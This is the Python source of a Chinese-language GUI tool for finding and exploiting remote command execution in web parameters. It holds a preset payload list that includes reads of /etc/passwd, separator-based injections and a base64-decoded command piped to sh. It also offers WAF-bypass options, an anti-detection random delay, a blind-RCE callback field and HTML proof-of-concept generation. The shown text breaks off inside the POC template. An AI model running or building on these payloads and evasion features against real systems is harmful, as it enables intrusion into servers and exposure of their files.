import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import requests
import re
import time
import random
from datetime import datetime
import os
import threading
from queue import Queue
import webbrowser
import zipfile
import shutil
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning

# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class RCEExploitTool:
    def __init__(self, root):
        self.root = root
        self.root.title("RCE漏洞利用工具1.1")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # 设置中文字体支持
        self.setup_fonts()
        
        # 确保报告和POC目录存在
        self.ensure_directory("reports")
        self.ensure_directory("pocs")
        
        # 线程安全控制
        self.testing_in_progress = False
        self.stop_testing = False
        self.queue = Queue()
        self.threads = []
        
        # 内置参数列表
        self.built_in_parameters = [
            "cmd", "command", "exec", "execute", "system", 
            "run", "code", "payload", "input", "data",
            "query", "action", "func", "function", "method",
            "param", "parameter", "arg", "argument", "shell"
        ]
        
        # 绕过WAF的技术
        self.waf_bypass_techniques = {
            "命令分隔符混淆": {
                "enabled": True,
                "description": "使用不同的命令分隔符绕过检测"
            },
            "特殊字符编码": {
                "enabled": True,
                "description": "使用URL编码、HTML实体等编码特殊字符"
            },
            "大小写混淆": {
                "enabled": True,
                "description": "随机改变命令字母的大小写"
            },
            "空字符插入": {
                "enabled": False,
                "description": "在命令中插入空字符或注释"
            },
            "命令拼接": {
                "enabled": True,
                "description": "将命令拆分为多个部分拼接执行"
            },
            "替代命令": {
                "enabled": True,
                "description": "使用功能相似的替代命令"
            },
            "变量替换": {
                "enabled": False,
                "description": "使用环境变量替换部分命令"
            },
            "编码绕过": {
                "enabled": True,
                "description": "使用Base64等编码执行命令"
            },
            "HTTP参数污染": {
                "enabled": False,
                "description": "通过重复参数绕过过滤"
            },
            "换行符绕过": {
                "enabled": True,
                "description": "在命令中插入换行符绕过检测"
            }
        }
        
        # 预设RCE Payloads
        self.rce_payloads = self.load_default_payloads()
        
        # 漏洞信息存储
        self.vulnerabilities = []
        
        # 设置UI
        self.setup_ui()
    
    def setup_fonts(self):
        """设置字体支持中文显示"""
        self.style = ttk.Style()
        self.style.configure(".", font=("SimHei", 9))
        self.style.configure("Header.TLabel", font=("SimHei", 10, "bold"))
        self.style.configure("TButton", font=("SimHei", 9))
        self.style.configure("TNotebook.Tab", font=("SimHei", 9))
    
    def ensure_directory(self, dir_name):
        """确保目录存在"""
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
    
    def load_default_payloads(self):
        """加载默认的RCE Payloads"""
        return [
            # 基础命令执行
            "id",
            "whoami",
            "echo%20%USERNAME%",  # Windows
            "echo%20$USER",       # Linux
            
            # 命令分隔符
            "127.0.0.1;id",
            "127.0.0.1|id",
            "127.0.0.1&&id",
            "127.0.0.1||id",
            
            # 编码绕过
            "echo%20YmFzaCAtYyAnZWNobyBJR05PUlkxMjMn|base64%20-d|sh",  # Linux
            "powershell%20-enc%20ZQBjAGgAbwAgAEkARwBOAE8AUgkVADAAOAAwAC4AMQAiAA==",  # Windows
            
            # 路径混淆
            "/bin/sh%20-c%20id",
            "cmd.exe%20/c%20whoami",
            
            # 空格绕过
            "cat</etc/passwd",
            "cat$IFS/etc/passwd",
            "cat%09/etc/passwd",
            
            # 特殊字符过滤绕过
            "i''d",
            "i`d",
            "i%d",
            "w'h'o'a'm'i",
            
            # 时间延迟测试 (盲RCE)
            "ping%20-c%205%20127.0.0.1",
            "ping%20-n%205%20127.0.0.1"
        ]
    
    def setup_ui(self):
        """设置用户界面"""
        # 创建主框架
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 顶部状态栏
        status_frame = ttk.Frame(main_frame, height=30)
        status_frame.pack(fill=tk.X, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="就绪", foreground="green")
        self.status_label.pack(side=tk.RIGHT)
        
        # 创建标签页控制器
        self.tab_control = ttk.Notebook(main_frame)
        
        # 创建各个标签页
        self.test_tab = ttk.Frame(self.tab_control)
        self.waf_tab = ttk.Frame(self.tab_control)
        self.results_tab = ttk.Frame(self.tab_control)
        self.report_tab = ttk.Frame(self.tab_control)
        
        # 添加标签页
        self.tab_control.add(self.test_tab, text="漏洞测试")
        self.tab_control.add(self.waf_tab, text="WAF绕过设置")
        self.tab_control.add(self.results_tab, text="测试结果")
        self.tab_control.add(self.report_tab, text="报告与下载")
        
        self.tab_control.pack(expand=1, fill="both")
        
        # 设置各个标签页内容
        self.setup_test_tab()
        self.setup_waf_tab()
        self.setup_results_tab()
        self.setup_report_tab()
    
    def setup_test_tab(self):
        """设置漏洞测试标签页"""
        # 主框架
        main_frame = ttk.Frame(self.test_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 目标URL设置
        url_frame = ttk.LabelFrame(main_frame, text="目标设置", padding="10")
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="目标URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.target_url = ttk.Entry(url_frame, width=80)
        self.target_url.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        ttk.Button(url_frame, text="提取参数", command=self.extract_parameters).grid(row=0, column=2, padx=5)
        
        # 请求方法选择
        method_frame = ttk.Frame(url_frame)
        method_frame.grid(row=1, column=1, sticky=tk.W, pady=2, padx=5)
        
        ttk.Label(method_frame, text="请求方法:").pack(side=tk.LEFT, padx=5)
        self.request_method = tk.StringVar(value="GET")
        method_combo = ttk.Combobox(method_frame, textvariable=self.request_method, 
                                   values=["GET", "POST", "PUT"], width=6)
        method_combo.pack(side=tk.LEFT)
        
        # 数据提交格式
        data_format_frame = ttk.Frame(url_frame)
        data_format_frame.grid(row=1, column=2, sticky=tk.W, pady=2, padx=5)
        
        ttk.Label(data_format_frame, text="数据格式:").pack(side=tk.LEFT, padx=5)
        self.data_format = tk.StringVar(value="form")
        format_combo = ttk.Combobox(data_format_frame, textvariable=self.data_format, 
                                   values=["form", "json", "xml"], width=6)
        format_combo.pack(side=tk.LEFT)
        
        # 参数选择区域
        param_frame = ttk.LabelFrame(main_frame, text="参数选择", padding="10")
        param_frame.pack(fill=tk.X, pady=5)
        
        # 参数来源选择
        self.param_source = tk.StringVar(value="built_in")
        ttk.Radiobutton(param_frame, text="内置参数", variable=self.param_source, value="built_in",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(param_frame, text="URL参数", variable=self.param_source, value="url",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(param_frame, text="自定义参数", variable=self.param_source, value="custom",
                       command=self.update_param_list).pack(side=tk.LEFT, padx=10)
        
        ttk.Label(param_frame, text="测试参数:").pack(side=tk.LEFT, padx=10)
        
        # 参数选择下拉框
        self.param_var = tk.StringVar()
        self.param_combobox = ttk.Combobox(param_frame, textvariable=self.param_var, width=25)
        self.param_combobox.pack(side=tk.LEFT, padx=5)
        
        # 自定义参数输入框
        self.custom_param = ttk.Entry(param_frame, width=20)
        self.custom_param.pack(side=tk.LEFT, padx=5)
        self.custom_param.bind("<FocusOut>", lambda e: self.add_custom_parameter())
        
        # 初始化URL参数列表
        self.url_parameters = []
        self.update_param_list()
        
        # 测试配置
        config_frame = ttk.LabelFrame(main_frame, text="测试配置", padding="10")
        config_frame.pack(fill=tk.X, pady=5)
        
        # 左侧配置
        left_config = ttk.Frame(config_frame)
        left_config.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # 超时设置
        ttk.Label(left_config, text="超时时间(秒):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.timeout = ttk.Entry(left_config, width=10)
        self.timeout.insert(0, "15")
        self.timeout.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        # 线程数
        ttk.Label(left_config, text="线程数:").grid(row=0, column=2, sticky=tk.W, pady=2)
        self.thread_count = ttk.Entry(left_config, width=10)
        self.thread_count.insert(0, "3")
        self.thread_count.grid(row=0, column=3, sticky=tk.W, pady=2, padx=5)
        
        # 右侧配置
        right_config = ttk.Frame(config_frame)
        right_config.pack(side=tk.RIGHT, fill=tk.X, expand=True)
        
        # 代理设置
        ttk.Label(right_config, text="代理(可选):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.proxy = ttk.Entry(right_config, width=40)
        self.proxy.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        # 测试选项
        options_frame = ttk.Frame(config_frame)
        options_frame.pack(fill=tk.X, pady=5)
        
        self.intensive_mode = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="深度测试模式", variable=self.intensive_mode).pack(side=tk.LEFT, padx=10)
        
        self.random_delay = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="随机延迟(防检测)", variable=self.random_delay).pack(side=tk.LEFT, padx=10)
        
        self.test_blind = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="包含盲RCE测试", variable=self.test_blind).pack(side=tk.LEFT, padx=10)
        
        ttk.Button(options_frame, text="WAF绕过设置", 
                  command=lambda: self.tab_control.select(1)).pack(side=tk.RIGHT, padx=10)
        
        # 盲RCE配置
        blind_frame = ttk.LabelFrame(config_frame, text="盲RCE测试配置")
        blind_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(blind_frame, text="回调地址(用于盲RCE测试):").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.callback_url = ttk.Entry(blind_frame, width=50)
        self.callback_url.insert(0, "http://your-server.com/rce-test")
        self.callback_url.grid(row=0, column=1, sticky=tk.W, pady=2, padx=5)
        
        ttk.Label(blind_frame, text="延迟时间阈值(秒):").grid(row=0, column=2, sticky=tk.W, pady=2)
        self.delay_threshold = ttk.Entry(blind_frame, width=10)
        self.delay_threshold.insert(0, "3")
        self.delay_threshold.grid(row=0, column=3, sticky=tk.W, pady=2, padx=5)
        
        # Payload区域
        payload_frame = ttk.LabelFrame(main_frame, text="Payload设置", padding="10")
        payload_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        payload_controls = ttk.Frame(payload_frame)
        payload_controls.pack(fill=tk.X)
        
        ttk.Label(payload_controls, text="测试Payload列表:").pack(side=tk.LEFT)
        ttk.Button(payload_controls, text="加载", command=self.load_payloads).pack(side=tk.RIGHT, padx=2)
        ttk.Button(payload_controls, text="保存", command=self.save_payloads).pack(side=tk.RIGHT, padx=2)
        ttk.Button(payload_controls, text="重置", command=self.reset_payloads).pack(side=tk.RIGHT, padx=2)
        
        self.payload_text = scrolledtext.ScrolledText(payload_frame, height=10)
        self.payload_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # 加载默认payloads
        for payload in self.rce_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        
        # 按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="开始测试", command=self.start_testing)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = ttk.Button(button_frame, text="停止测试", command=self.stop_testing_action, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        ttk.Button(button_frame, text="清空配置", command=self.clear_test_config).pack(side=tk.RIGHT, padx=10)
    
    def setup_waf_tab(self):
        """设置WAF绕过设置标签页（独立页面）"""
        main_frame = ttk.Frame(self.waf_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 标题和说明
        ttk.Label(main_frame, text="WAF绕过技术配置", font=("SimHei", 12, "bold")).pack(anchor=tk.W, pady=10)
        ttk.Label(
            main_frame, 
            text="选择要应用的WAF绕过技术，勾选的技术将在测试中随机组合使用。\n"
                 "建议根据目标系统特点选择合适的绕过技术组合。"
        ).pack(anchor=tk.W, pady=5)
        
        # 技术列表框架
        techniques_frame = ttk.LabelFrame(main_frame, text="绕过技术", padding="10")
        techniques_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # 创建技术复选框
        self.waf_checkbuttons = {}
        row = 0
        col = 0
        
        for tech_name, tech_info in self.waf_bypass_techniques.items():
            var = tk.BooleanVar(value=tech_info["enabled"])
            cb = ttk.Checkbutton(
                techniques_frame, 
                text=tech_name, 
                variable=var
            )
            cb.grid(row=row, column=col, sticky=tk.W, padx=15, pady=8)
            
            # 添加描述标签
            desc_label = ttk.Label(
                techniques_frame, 
                text=tech_info["description"], 
                font=("SimHei", 8),
                foreground="#666666"
            )
            desc_label.grid(row=row+1, column=col, sticky=tk.W, padx=20, pady=0)
            
            self.waf_checkbuttons[tech_name] = var
            
            # 布局控制
            col += 1
            if col >= 2:
                col = 0
                row += 2
        
        # 操作系统选择
        os_frame = ttk.LabelFrame(main_frame, text="目标系统", padding="10")
        os_frame.pack(fill=tk.X, pady=10)
        
        self.target_os = tk.StringVar(value="both")
        ttk.Radiobutton(os_frame, text="Linux", variable=self.target_os, value="linux").pack(side=tk.LEFT, padx=15)
        ttk.Radiobutton(os_frame, text="Windows", variable=self.target_os, value="windows").pack(side=tk.LEFT, padx=15)
        ttk.Radiobutton(os_frame, text="自动检测", variable=self.target_os, value="both").pack(side=tk.LEFT, padx=15)
        
        # 预设级别
        preset_frame = ttk.LabelFrame(main_frame, text="预设级别", padding="10")
        preset_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(preset_frame, text="基础绕过", command=self.apply_basic_bypass).pack(side=tk.LEFT, padx=15)
        ttk.Button(preset_frame, text="中级绕过", command=self.apply_medium_bypass).pack(side=tk.LEFT, padx=15)
        ttk.Button(preset_frame, text="高级绕过", command=self.apply_advanced_bypass).pack(side=tk.LEFT, padx=15)
        
        # 提示信息
        ttk.Label(
            main_frame, 
            text="提示：过多的绕过技术组合可能导致测试效率下降，建议根据目标系统调整。",
            font=("SimHei", 9),
            foreground="#FF6600"
        ).pack(anchor=tk.W, pady=10)
    
    def setup_results_tab(self):
        """设置测试结果标签页"""
        main_frame = ttk.Frame(self.results_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 结果控制区
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(control_frame, text="漏洞筛选:").pack(side=tk.LEFT, padx=5)
        self.vuln_filter = tk.StringVar(value="全部")
        filter_combo = ttk.Combobox(control_frame, textvariable=self.vuln_filter, 
                                   values=["全部", "高风险", "中风险", "低风险"], width=10)
        filter_combo.pack(side=tk.LEFT, padx=5)
        filter_combo.bind("<<ComboboxSelected>>", self.filter_vulnerabilities)
        
        ttk.Button(control_frame, text="生成POC", command=self.generate_and_download_poc).pack(side=tk.RIGHT, padx=5)
        ttk.Button(control_frame, text="生成报告", command=self.generate_and_download_report).pack(side=tk.RIGHT, padx=5)
        
        # 漏洞列表
        ttk.Label(main_frame, text="发现的漏洞:").pack(anchor=tk.W, pady=2)
        self.vuln_tree = ttk.Treeview(main_frame, columns=("id", "url", "param", "type", "severity"), show="headings")
        self.vuln_tree.heading("id", text="ID")
        self.vuln_tree.heading("url", text="URL")
        self.vuln_tree.heading("param", text="参数")
        self.vuln_tree.heading("type", text="漏洞类型")
        self.vuln_tree.heading("severity", text="风险等级")
        
        self.vuln_tree.column("id", width=50)
        self.vuln_tree.column("url", width=300)
        self.vuln_tree.column("param", width=100)
        self.vuln_tree.column("type", width=150)
        self.vuln_tree.column("severity", width=80)
        
        # 添加滚动条
        tree_scroll = ttk.Scrollbar(main_frame, orient="vertical", command=self.vuln_tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.vuln_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.vuln_tree.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # 结果详情
        ttk.Label(main_frame, text="漏洞详情:").pack(anchor=tk.W, pady=2)
        self.result_text = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, height=10)
        self.result_text.pack(fill=tk.BOTH, expand=True)
        self.result_text.tag_config("success", foreground="#008000")
        self.result_text.tag_config("error", foreground="#ff0000")
        self.result_text.tag_config("info", foreground="#0000ff")
        self.result_text.tag_config("warning", foreground="#ffA500")
        
        # 绑定树视图选择事件
        self.vuln_tree.bind("<<TreeviewSelect>>", self.show_vuln_details)
    
    def setup_report_tab(self):
        """设置报告与下载标签页"""
        main_frame = ttk.Frame(self.report_tab, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 下载路径设置
        path_frame = ttk.LabelFrame(main_frame, text="下载设置", padding="10")
        path_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(path_frame, text="下载路径:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.download_path = ttk.Entry(path_frame, width=60)
        self.download_path.grid(row=0, column=1, pady=5, padx=5)
        self.download_path.insert(0, os.path.abspath("."))
        ttk.Button(path_frame, text="浏览...", 
                  command=lambda: self.choose_download_path()).grid(row=0, column=2, padx=5)
        
        # 批量操作区域
        batch_frame = ttk.LabelFrame(main_frame, text="批量操作", padding="10")
        batch_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(batch_frame, text="下载所有POC", command=self.batch_download_pocs).pack(side=tk.LEFT, padx=15, pady=5)
        ttk.Button(batch_frame, text="下载完整报告", command=self.generate_complete_report).pack(side=tk.LEFT, padx=15, pady=5)
        ttk.Button(batch_frame, text="打包下载全部", command=self.package_all_downloads).pack(side=tk.LEFT, padx=15, pady=5)
        
        # 历史记录区域
        history_frame = ttk.LabelFrame(main_frame, text="下载历史", padding="10")
        history_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # 创建历史记录树视图
        self.download_history = ttk.Treeview(history_frame, columns=("name", "type", "path", "date"), show="headings")
        self.download_history.heading("name", text="文件名")
        self.download_history.heading("type", text="类型")
        self.download_history.heading("path", text="保存路径")
        self.download_history.heading("date", text="下载时间")
        
        self.download_history.column("name", width=200)
        self.download_history.column("type", width=80)
        self.download_history.column("path", width=400)
        self.download_history.column("date", width=150)
        
        # 添加滚动条
        history_scroll = ttk.Scrollbar(history_frame, orient="vertical", command=self.download_history.yview)
        history_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.download_history.configure(yscrollcommand=history_scroll.set)
        
        self.download_history.pack(fill=tk.BOTH, expand=True)
        
        # 历史记录控制按钮
        history_controls = ttk.Frame(history_frame)
        history_controls.pack(fill=tk.X, pady=5)
        
        ttk.Button(history_controls, text="打开文件", command=self.open_downloaded_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(history_controls, text="打开文件夹", command=self.open_download_folder).pack(side=tk.LEFT, padx=5)
        ttk.Button(history_controls, text="清空历史", command=self.clear_download_history).pack(side=tk.RIGHT, padx=5)
        
        # 初始化下载历史列表
        self.download_records = []
    
    # UI事件处理函数
    def update_param_list(self):
        """根据选择的参数来源更新参数列表"""
        source = self.param_source.get()
        
        if source == "built_in":
            # 内置参数
            self.param_combobox['values'] = self.built_in_parameters
            self.param_combobox.config(state="readonly")
            self.custom_param.config(state="disabled")
            if self.built_in_parameters:
                self.param_combobox.current(0)
        elif source == "url":
            # URL参数
            self.param_combobox['values'] = self.url_parameters
            self.param_combobox.config(state="readonly")
            self.custom_param.config(state="disabled")
            if self.url_parameters:
                self.param_combobox.current(0)
            else:
                self.param_var.set("")
                messagebox.showinfo("信息", "未从URL中提取到参数，请先输入URL并点击提取参数")
        elif source == "custom":
            # 自定义参数
            self.param_combobox['values'] = []
            self.param_combobox.config(state="disabled")
            self.custom_param.config(state="normal")
    
    def extract_parameters(self):
        """从URL中提取参数"""
        url = self.target_url.get().strip()
        if not url:
            messagebox.showwarning("警告", "请输入目标URL")
            return
            
        if not re.match(r"^https?://", url):
            url = f"http://{url}"
            
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                self.url_parameters = list(query_params.keys())
                self.param_source.set("url")
                self.update_param_list()
                self.log(f"从URL中提取到 {len(self.url_parameters)} 个参数", "info")
            else:
                messagebox.showinfo("信息", "URL中未发现参数，您可以使用内置参数或自定义参数")
        except Exception as e:
            self.log(f"提取参数失败: {str(e)}", "error")
    
    def add_custom_parameter(self):
        """添加自定义参数"""
        param_name = self.custom_param.get().strip()
        if param_name and self.param_source.get() == "custom":
            self.param_var.set(param_name)
    
    def load_payloads(self):
        """从文件加载payloads"""
        file_path = filedialog.askopenfilename(filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")])
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    payloads = f.read()
                    self.payload_text.delete(1.0, tk.END)
                    self.payload_text.insert(tk.END, payloads)
                self.log(f"已从文件加载payloads", "info")
            except Exception as e:
                self.log(f"加载payload文件失败: {str(e)}", "error")
    
    def save_payloads(self):
        """保存payloads到文件"""
        payloads = self.payload_text.get(1.0, tk.END).strip()
        if not payloads:
            messagebox.showwarning("警告", "没有payload可保存")
            return
            
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")])
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(payloads)
                self.log(f"Payload已保存到 {file_path}", "info")
            except Exception as e:
                self.log(f"保存payload失败: {str(e)}", "error")
    
    def reset_payloads(self):
        """重置payload到默认值"""
        self.payload_text.delete(1.0, tk.END)
        for payload in self.rce_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        self.log("已重置为默认payload", "info")
    
    def clear_test_config(self):
        """清空测试配置"""
        if self.testing_in_progress:
            messagebox.showwarning("警告", "测试正在进行中，无法清空配置")
            return
            
        self.target_url.delete(0, tk.END)
        self.proxy.delete(0, tk.END)
        self.payload_text.delete(1.0, tk.END)
        for payload in self.rce_payloads:
            self.payload_text.insert(tk.END, payload + "\n")
        self.param_source.set("built_in")
        self.update_param_list()
        self.intensive_mode.set(False)
        self.random_delay.set(True)
        self.test_blind.set(True)
        self.log("已清空测试配置", "info")
    
    def log(self, message, tag="info"):
        """在结果区域显示日志信息"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.result_text.insert(tk.END, f"[{timestamp}] {message}\n", tag)
        self.result_text.see(tk.END)
        self.root.update_idletasks()
    
    # WAF绕过策略
    def apply_basic_bypass(self):
        """应用基础绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(tech_name in [
                "命令分隔符混淆", "大小写混淆", "换行符绕过"
            ])
    
    def apply_medium_bypass(self):
        """应用中级绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(tech_name in [
                "命令分隔符混淆", "特殊字符编码", "大小写混淆",
                "命令拼接", "替代命令", "换行符绕过"
            ])
    
    def apply_advanced_bypass(self):
        """应用高级绕过高级绕过策略"""
        for tech_name, var in self.waf_checkbuttons.items():
            var.set(True)
    
    # 下载相关功能
    def choose_download_path(self):
        """选择下载路径"""
        path = filedialog.askdirectory(title="选择下载路径")
        if path:
            self.download_path.delete(0, tk.END)
            self.download_path.insert(0, path)
    
    def add_to_download_history(self, filename, file_type, path):
        """添加到下载历史"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.download_records.append({
            "name": filename,
            "type": file_type,
            "path": path,
            "date": timestamp
        })
        
        # 更新历史记录树视图
        self.download_history.insert("", tk.END, values=(filename, file_type, path, timestamp))
        
        # 限制历史记录数量
        if len(self.download_records) > 50:
            self.download_records.pop(0)
            oldest_item = self.download_history.get_children()[0]
            self.download_history.delete(oldest_item)
    
    def open_downloaded_file(self):
        """打开选中的下载文件"""
        selected_items = self.download_history.selection()
        if not selected_items:
            messagebox.showwarning("警告", "请先选择一个文件")
            return
            
        item = selected_items[0]
        file_path = self.download_history.item(item, "values")[2]
        
        if os.path.exists(file_path):
            webbrowser.open(f"file://{os.path.abspath(file_path)}")
        else:
            messagebox.showerror("错误", "文件不存在或已被移动")
            # 从历史记录中移除
            self.download_history.delete(item)
    
    def open_download_folder(self):
        """打开下载文件夹"""
        selected_items = self.download_history.selection()
        if not selected_items:
            messagebox.showwarning("警告", "请先选择一个文件")
            return
            
        item = selected_items[0]
        file_path = self.download_history.item(item, "values")[2]
        folder_path = os.path.dirname(file_path)
        
        if os.path.exists(folder_path):
            webbrowser.open(f"file://{os.path.abspath(folder_path)}")
        else:
            messagebox.showerror("错误", "文件夹不存在")
    
    def clear_download_history(self):
        """清空下载历史"""
        if messagebox.askyesno("确认", "确定要清空下载历史吗?"):
            for item in self.download_history.get_children():
                self.download_history.delete(item)
            self.download_records = []
    
    # 漏洞结果处理
    def get_current_param(self):
        """获取当前选择的参数"""
        source = self.param_source.get()
        if source == "custom":
            return self.custom_param.get().strip()
        return self.param_var.get().strip()
    
    def get_vulnerability_severity(self, vuln):
        """评估漏洞严重程度"""
        if "直接命令执行" in vuln['type']:
            return "高风险"
        if "盲RCE" in vuln['type'] and vuln['status'] == "已确认":
            return "中风险"
        return "低风险"
    
    def update_vulnerability_list(self):
        """更新漏洞列表"""
        # 清空现有列表
        for item in self.vuln_tree.get_children():
            self.vuln_tree.delete(item)
        
        # 添加漏洞到列表
        for vuln in self.vulnerabilities:
            severity = self.get_vulnerability_severity(vuln)
            self.vuln_tree.insert("", tk.END, values=(
                vuln['id'], 
                vuln['url'].split('?')[0], 
                self.get_current_param(),
                vuln['type'],
                severity
            ))
    
    def filter_vulnerabilities(self, event):
        """筛选漏洞列表"""
        filter_text = self.vuln_filter.get()
        
        # 清空现有列表
        for item in self.vuln_tree.get_children():
            self.vuln_tree.delete(item)
        
        # 添加符合条件的漏洞
        for vuln in self.vulnerabilities:
            severity = self.get_vulnerability_severity(vuln)
            if filter_text == "全部" or severity == filter_text:
                self.vuln_tree.insert("", tk.END, values=(
                    vuln['id'], 
                    vuln['url'].split('?')[0], 
                    self.get_current_param(),
                    vuln['type'],
                    severity
                ))
    
    def show_vuln_details(self, event):
        """显示选中漏洞的详情"""
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            return
            
        item = selected_items[0]
        vuln_id = int(self.vuln_tree.item(item, "values")[0])
        
        # 查找对应的漏洞信息
        for vuln in self.vulnerabilities:
            if vuln['id'] == vuln_id:
                # 显示漏洞详情
                details = f"漏洞 ID: {vuln['id']}\n"
                details += f"目标 URL: {vuln['url']}\n"
                details += f"测试参数: {self.get_current_param()}\n"
                details += f"Payload: {vuln['payload']}\n"
                details += f"状态码: {vuln['status_code']}\n"
                details += f"响应时间: {vuln['response_time']:.2f}秒\n"
                details += f"漏洞类型: {vuln['type']}\n"
                details += f"状态: {vuln['status']}\n"
                details += f"风险等级: {self.get_vulnerability_severity(vuln)}\n\n"
                details += f"描述: {vuln['description']}\n"
                
                self.result_text.delete(1.0, tk.END)
                self.result_text.insert(tk.END, details)
                return
    
    # POC和报告生成
    def generate_and_download_poc(self):
        """生成POC并下载到指定路径"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成POC")
            return
            
        # 获取选中的漏洞
        selected_items = self.vuln_tree.selection()
        if not selected_items:
            # 如果没有选中，让用户选择
            vuln_ids = [str(v['id']) for v in self.vulnerabilities]
            selected_id = simpledialog.askinteger(
                "选择漏洞", 
                f"请选择要生成POC的漏洞ID (1-{len(self.vulnerabilities)}):",
                minvalue=1, 
                maxvalue=len(self.vulnerabilities)
            )
            
            if not selected_id:
                return
                
            vuln = self.vulnerabilities[selected_id - 1]
        else:
            # 使用选中的漏洞
            item = selected_items[0]
            vuln_id = int(self.vuln_tree.item(item, "values")[0])
            vuln = next(v for v in self.vulnerabilities if v['id'] == vuln_id)
        
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "pocs"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"rce_poc_{vuln['id']}_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建POC内容
        poc_content = self.generate_poc_content(vuln)
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(poc_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "POC", file_path)
            
            self.log(f"POC已下载到: {file_path}", "success")
            
            # 询问是否打开POC文件
            if messagebox.askyesno("POC生成成功", f"POC已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成POC失败: {str(e)}", "error")
    
    def generate_poc_content(self, vuln):
        """生成POC内容"""
        severity = self.get_vulnerability_severity(vuln)
        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RCE漏洞POC - {vuln['id']}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; }}
        .poc-box {{ border: 1px solid #ccc; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .payload {{ background-color: #f5f5f5; padding: 10px; font-family: monospace; word-break: break-all; white-space: pre-wrap; }}
        .button {{ background-color: #4CAF50; color: white; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; }}
        .button:hover {{ background-color: #45a049; }}
        .severity {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.9em; font-weight: bold; margin-left: 10px; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
    </style>
</head>
<body>
    <h1>RCE漏洞POC验证报告</h1>
    <div class="poc-box">
        <h2>漏洞信息 <span class="severity {severity.replace('风险', '').lower()}">{severity}</span></h2>
        <p><strong>ID:</strong> {vuln['id']}</p>
        <p><strong>目标URL:</strong> {vuln['url']}</p>
